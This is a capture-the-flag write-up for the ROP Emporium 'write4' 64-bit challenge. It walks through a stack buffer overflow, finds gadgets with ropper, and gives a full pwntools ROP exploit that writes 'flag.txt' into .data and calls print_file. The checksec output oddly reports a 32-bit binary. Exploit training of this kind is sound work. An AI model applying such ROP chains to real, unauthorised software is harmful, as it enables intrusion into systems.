# write4 - 64 Bit
Program execution:
```
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> <input_here>
```
Run checksec: `checksec ./write4`
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Again, `main` call `pwnme`, but this time `pwnme` is in an external file, which must be the given libwrite4.so.

Disassembling libwrite4.so shows that just like in the past challenges, `pwnme` unsafely reads too many (0x200) bytes in to a 32 byte buffer at `rbp-0x20`:
```assembly
lea     rax, [rbp-0x20 {var_28}]
mov     edx, 0x200
mov     rsi, rax {var_28}
mov     edi, 0x0
call    read
```

We also find the implementation of a `print_file` function which was in the binary's GOT:
```c
int64_t print_file(char* arg1)

00000965  FILE* rax_1 = fopen(filename: arg1, mode: data_a37)
000009a7  if (rax_1 != 0)
000009a7      void var_38
000009a7      fgets(buf: &var_38, n: 0x21, fp: rax_1)
000009b3      puts(str: &var_38)
000009ce      return fclose(fp: rax_1)
00000988  printf(format: "Failed to open file: %s\n", arg1)
00000992  exit(status: 1)
00000992  noreturn
```

This function will print a file specified by the string argument (address). So we want to pass "flag.txt" into this function.
Running `rabin2 -z write4` reveals that there is no flag.txt string:
```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent
```
This means we will need to store a "flag.txt" string somewhere where we know the address (so stack won't work). This area of memory will also need to be writeable. We can use `readelf` to view a list of program segments and their accessibility flags.
`readelf -S write4`:
```
There are 29 section headers, starting at offset 0x1980:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
       0000000000000038  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002d0  000002d0
       00000000000000f0  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           00000000004003c0  000003c0
       000000000000007c  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           000000000040043c  0000043c
       0000000000000014  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400450  00000450
       0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400470  00000470
       0000000000000030  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             00000000004004a0  000004a0
       0000000000000030  0000000000000018  AI       5    22     8
  [11] .init             PROGBITS         00000000004004d0  000004d0
       0000000000000017  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000004004f0  000004f0
       0000000000000030  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000400520  00000520
       0000000000000182  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         00000000004006a4  000006a4
       0000000000000009  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         00000000004006b0  000006b0
       0000000000000010  0000000000000000   A       0     0     4
  [16] .eh_frame_hdr     PROGBITS         00000000004006c0  000006c0
       0000000000000044  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000400708  00000708
       0000000000000120  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000600df0  00000df0
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00
       00000000000001f0  0000000000000010  WA       6     0     8
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
  [25] .comment          PROGBITS         0000000000000000  00001038
       0000000000000029  0000000000000001  MS       0     0     1
  [26] .symtab           SYMTAB           0000000000000000  00001068
       0000000000000618  0000000000000018          27    46     8
  [27] .strtab           STRTAB           0000000000000000  00001680
       00000000000001f6  0000000000000000           0     0     1
  [28] .shstrtab         STRTAB           0000000000000000  00001876
       0000000000000103  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```
We're interested in the sections with the `W` flag (writable). `.data` is as good as any and putting data there is the least likely to cause issues. To be safe we can use `objdump` to view a hexdump of that section and confirm there is no important data we are at risk of overwriting:
`objdump -s -j .data write4`:
```
write4:     file format elf64-x86-64

Contents of section .data:
 601028 00000000 00000000 00000000 00000000  ................
```
So we know we need to write "flag.txt" to `.data`, but what ROP gadgets can we use to achieve that? We need to find `mov` gadgets that work with memory address (`[reg]` notation).
`ropper -f write4 --search 'mov [???], ???'`:
```
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [???], ???

[INFO] File: write4
0x0000000000400629: mov dword ptr [rsi], edi; ret;
0x0000000000400628: mov qword ptr [r14], r15; ret;
```
We would rather move 8 bytes at a time (qword) so we'll use the 2nd gadget. So now we need to find gadgets that will let us pop items off the stack and into `r14`, `r15` and `rdi` (1st argument register).

`ropper -f write4 --search 'pop'`:
```
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: write4
0x000000000040068c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040068e: pop r13; pop r14; pop r15; ret;
0x0000000000400690: pop r14; pop r15; ret;
0x0000000000400692: pop r15; ret;
0x000000000040057b: pop rbp; mov edi, 0x601038; jmp rax;
0x000000000040068b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040068f: pop rbp; pop r14; pop r15; ret;
0x0000000000400588: pop rbp; ret;
0x0000000000400693: pop rdi; ret;
0x0000000000400691: pop rsi; pop r15; ret;
0x000000000040068d: pop rsp; pop r13; pop r14; pop r15; ret;
```
Coincidentally there is 1 gadget that will let us pop `r14` and `r15` (`0x0000000000400690`), and there is another gadget that will let us pop `rdi` (`0x0000000000400693`)
Since we can only move 8 bytes at a time, we will have to do 2 moves. One for "flag.txt" and one with just null bytes so that our string ends with a null terminator.
Each time we write 8 bytes, remember we need to offset the .data address to write to, by 8.

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./write4"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
     gdb.attach(p, '''break main''')

data_addr = 0x0000000000601028
mov_ptr_r14_r15_addr = 0x0000000000400628 # mov qword ptr [r14], r15; ret;
pop_r14_r15_addr = 0x0000000000400690     # pop r14; pop r15; ret;
pop_rdi_addr = 0x0000000000400693         # pop rdi; ret;

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)

for i, string in enumerate([b'flag.txt', b'\x00'*8]):
     # build our string, 8 bytes at a time
     payload += p64(pop_r14_r15_addr)
     payload += p64(data_addr + i*8)
     payload += string
     payload += p64(mov_ptr_r14_r15_addr)

# with our .data set up, we can call print_file
payload += p64(pop_rdi_addr)
payload += p64(data_addr)
payload += p64(elf.symbols['print_file'])

p.sendline(payload)

p.interactive()
```

And we get the flag:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```